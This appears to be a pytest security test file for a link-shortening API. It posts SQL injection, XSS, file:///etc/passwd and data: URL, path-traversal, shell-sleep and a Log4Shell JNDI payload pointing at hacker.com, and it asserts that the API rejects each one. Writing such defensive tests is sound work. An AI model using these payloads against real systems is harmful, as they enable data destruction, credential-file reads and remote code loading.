import pytest
from httpx import AsyncClient


@pytest.mark.integration
class TestSecurityEndpoints:
    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "payload",
        [
            "' OR '1'='1",
            "admin'--",
            "'; DROP TABLE users;--",
            '" OR "1"="1',
            "1; SELECT pg_sleep(5);--",
        ],
    )
    async def test_sqli_registration(self, client: AsyncClient, payload: str):
        response = await client.post(
            "/auth/register",
            json={
                "username": f"user_{payload}",
                "email": "hacker@example.com",
                "password": "password123",
            },
        )
        assert response.status_code in [201, 400, 422, 409]

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "payload",
        [
            "<script>alert(1)</script>",
            "javascript:alert(1)",
            '"><svg/onload=alert(1)>',
            "some_alias' OR '1'='1",
        ],
    )
    async def test_xss_sqli_custom_alias(self, client: AsyncClient, payload: str):
        response = await client.post(
            "/links/shorten",
            json={"original_url": "https://example.com/safe", "custom_alias": payload},
        )
        assert response.status_code == 422

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "payload",
        [
            "javascript:alert(1)",
            "file:///etc/passwd",
            "data:text/html,<script>alert(1)</script>",
            "htp://typo",
        ],
    )
    async def test_invalid_url_schemes(self, client: AsyncClient, payload: str):
        response = await client.post("/links/shorten", json={"original_url": payload})
        assert response.status_code == 422

    @pytest.mark.asyncio
    async def test_oversized_payload_registration(self, client: AsyncClient):
        huge_string = "A" * 10000
        response = await client.post(
            "/auth/register",
            json={
                "username": huge_string[:500],
                "email": f"{huge_string[:50]}@example.com",
                "password": "password123",
            },
        )
        assert response.status_code in [400, 422, 500]

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "payload",
        [
            "../",
            "%00",
            "(sleep 5)",
            "${jndi:ldap://hacker.com/a}",
        ],
    )
    async def test_path_traversal_and_injection_in_redirect(
        self, client: AsyncClient, payload: str
    ):
        response = await client.get(f"/{payload}", follow_redirects=False)
        assert response.status_code in [404, 422]
